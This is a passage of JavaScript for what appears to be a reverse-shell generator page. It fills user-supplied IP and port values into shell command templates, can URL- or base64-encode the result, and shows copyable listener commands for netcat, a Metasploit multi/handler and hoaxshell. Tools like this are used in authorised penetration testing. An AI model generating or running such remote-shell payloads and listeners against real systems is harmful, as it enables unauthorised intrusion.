        shellElement.className = 'shell-item';
        shellElement.innerHTML = `
            <div class="shell-header">
                <h4>${shell.name}</h4>
                <p>${shell.description}</p>
                <div class="shell-os">
                    ${shell.os.map(os => `<span class="os-tag">${os}</span>`).join('')}
                </div>
                <div class="expand-icon">▼</div>
            </div>
            <div class="shell-expanded" style="display: none;">
                <div class="command-section">
                    <h5>Command:</h5>
                    <div class="command-output">
                        <pre class="command-text"><code></code></pre>
                        <button class="copy-button" onclick="copyCommand(this)">Copy</button>
                    </div>
                </div>
                <div class="listener-section">
                    <h5>Listener:</h5>
                    <div class="listener-output">
                        <pre class="listener-text"><code class="language-bash"></code></pre>
                        <button class="copy-button" onclick="copyListener(this)">Copy</button>
                    </div>
                </div>
            </div>
        `;
        
        shellElement.addEventListener('click', function(e) {
            // Don't toggle if clicking on copy buttons
            if (e.target.classList.contains('copy-button')) {
                return;
            }
            toggleShell(shell, shellElement);
        });
        
        container.appendChild(shellElement);
    });
    
    if (filteredShells.length === 0) {
        container.innerHTML = '<div class="shell-item"><h4>No shells found</h4><p>Try adjusting your filters</p></div>';
    }
}

function toggleShell(shell, element) {
    const expandedSection = element.querySelector('.shell-expanded');
    const expandIcon = element.querySelector('.expand-icon');
    const isExpanded = expandedSection.style.display !== 'none';
    
    // Close all other expanded shells
    document.querySelectorAll('.shell-item').forEach(item => {
        if (item !== element) {
            const otherExpanded = item.querySelector('.shell-expanded');
            const otherIcon = item.querySelector('.expand-icon');
            otherExpanded.style.display = 'none';
            otherIcon.style.transform = 'rotate(0deg)';
            item.classList.remove('expanded');
        }
    });
    
    if (isExpanded) {
        // Collapse current shell
        expandedSection.style.display = 'none';
        expandIcon.style.transform = 'rotate(0deg)';
        element.classList.remove('expanded');
    } else {
        // Expand current shell
        expandedSection.style.display = 'block';
        expandIcon.style.transform = 'rotate(180deg)';
        element.classList.add('expanded');
        
        // Update commands
        updateShellCommands(shell, element);
    }
}

function detectLanguage(shellName, command) {
    const name = shellName.toLowerCase();
    
    // PowerShell
    if (name.includes('powershell') || command.includes('$') || command.includes('IRM') || command.includes('Invoke-')) {
        return 'powershell';
    }
    
    // PHP
    if (name.includes('php') || command.includes('<?php') || command.includes('php -r')) {
        return 'php';
    }
    
    // Python
    if (name.includes('python') || command.includes('python -c') || command.includes('python3 -c')) {
        return 'python';
    }
    
    // Perl
    if (name.includes('perl') || command.includes('perl -e')) {
        return 'perl';
    }
    
    // Ruby
    if (name.includes('ruby') || command.includes('ruby -e')) {
        return 'ruby';
    }
    
    // Java
    if (name.includes('java') || command.includes('public class') || command.includes('import java')) {
        return 'java';
    }
    
    // JavaScript/Node.js
    if (name.includes('javascript') || name.includes('node') || command.includes('require(')) {
        return 'javascript';
    }
    
    // C/C++
    if (name.includes('c++') || name.includes('c#') || command.includes('#include') || command.includes('using System')) {
        return 'clike';
    }
    
    // Go
    if (name.includes('golang') || name.includes('go ') || command.includes('package main')) {
        return 'go';
    }
    
    // Lua
    if (name.includes('lua')) {
        return 'lua';
    }
    
    // MSFVenom (treat as bash since it's command line)
    if (name.includes('msfvenom')) {
        return 'bash';
    }
    
    // Default to bash for shell commands
    return 'bash';
}

function updateShellCommands(shell, element) {
    const ip = document.getElementById('ip-input').value || '127.0.0.1';
    const port = document.getElementById('port-input').value || '4444';
    const shellCmd = document.getElementById('shell-select').value;
    const encoding = document.querySelector('input[name="encoding"]:checked').value;
    
    let command = shell.command;
    command = command.replace(/{ip}/g, ip);
    command = command.replace(/{port}/g, port);
    command = command.replace(/{shell}/g, shellCmd);
    
    // Apply encoding
    if (encoding === 'url') {
        command = encodeURIComponent(command);
    } else if (encoding === 'base64') {
        command = btoa(command);
    }
    
    // Remove trailing newlines and whitespace, but keep internal formatting
    command = command.replace(/\s+$/, '');
    
    // Update command text with syntax highlighting
    const commandCode = element.querySelector('.command-text code');
    const language = detectLanguage(shell.name, command);
    commandCode.className = `language-${language}`;
    commandCode.textContent = command;
    
    // Apply syntax highlighting
    if (typeof Prism !== 'undefined') {
        Prism.highlightElement(commandCode);
    }
    
    // Update listener command
    let listenerCmd = '';
    if (currentTab === 'reverse') {
        listenerCmd = `nc -nlvp ${port}`;
    } else if (currentTab === 'bind') {
        listenerCmd = `nc ${ip} ${port}`;
    } else if (currentTab === 'msfvenom') {
        listenerCmd = `msfconsole -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${port}; run"`;
    } else if (currentTab === 'hoaxshell') {
        listenerCmd = `python3 hoaxshell.py -s ${port}`;
    }
    
    const listenerCode = element.querySelector('.listener-text code');
    listenerCode.textContent = listenerCmd;
    
    // Apply syntax highlighting to listener
    if (typeof Prism !== 'undefined') {
        Prism.highlightElement(listenerCode);
    }
}

function selectShell(shell, element) {
    // This function is now replaced by toggleShell
    toggleShell(shell, element);
}

function updateAllExpandedShells() {
    document.querySelectorAll('.shell-item.expanded').forEach(shellElement => {
        // Find the shell data by matching the name
        const shellName = shellElement.querySelector('h4').textContent;
        const shells = shellData[currentTab] || [];
        const shell = shells.find(s => s.name === shellName);
        
        if (shell) {
            updateShellCommands(shell, shellElement);
        }
    });
}

function updateCommand() {
    // This function is now replaced by updateAllExpandedShells
    updateAllExpandedShells();
}

function showListenerCommand() {
    // This function is now handled inline in updateShellCommands
    return;
}

function copyCommand(button) {
    const commandText = button.parentElement.querySelector('.command-text code').textContent;
    navigator.clipboard.writeText(commandText).then(() => {
        showToast('Command copied to clipboard!');
    }).catch(err => {
        showToast('Failed to copy command', 'error');
    });
}

function copyListener(button) {
    const listenerText = button.parentElement.querySelector('.listener-text code').textContent;
    navigator.clipboard.writeText(listenerText).then(() => {
        showToast('Listener command copied to clipboard!');
    }).catch(err => {
        showToast('Failed to copy listener command', 'error');
    });
}

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    const toastContent = toast.querySelector('span');
    const toastIcon = toast.querySelector('i');
    
    // Update toast content
    toastContent.textContent = message;
    
    // Update toast style based on type
    if (type === 'error') {
        toast.style.backgroundColor = 'var(--danger-color)';
        toastIcon.className = 'fas fa-exclamation-circle';
    } else {
        toast.style.backgroundColor = 'var(--secondary-color)';
        toastIcon.className = 'fas fa-check-circle';
    }
    
    // Show toast
    toast.classList.add('show');
    
    // Hide toast after 3 seconds
    setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
}

// Local storage functions
function saveSettings() {
    const settings = {
        ip: document.getElementById('ip-input').value,
        port: document.getElementById('port-input').value,
        shell: document.getElementById('shell-select').value,
        encoding: document.querySelector('input[name="encoding"]:checked').value
    };
    
    localStorage.setItem('reverseShellSettings', JSON.stringify(settings));
}

function loadSettings() {
    const savedSettings = localStorage.getItem('reverseShellSettings');
    
    if (savedSettings) {
        try {
            const settings = JSON.parse(savedSettings);
            
            // Restore IP
            if (settings.ip) {
                document.getElementById('ip-input').value = settings.ip;
            }
            
            // Restore port
            if (settings.port) {
                document.getElementById('port-input').value = settings.port;
            }
            
            // Restore shell
            if (settings.shell) {
                document.getElementById('shell-select').value = settings.shell;
            }
            
            // Restore encoding
            if (settings.encoding) {
                const encodingRadio = document.querySelector(`input[name="encoding"][value="${settings.encoding}"]`);
                if (encodingRadio) {
                    encodingRadio.checked = true;
                }
            }
            
        } catch (e) {
            console.warn('Failed to load saved settings:', e);
        }
    }
}
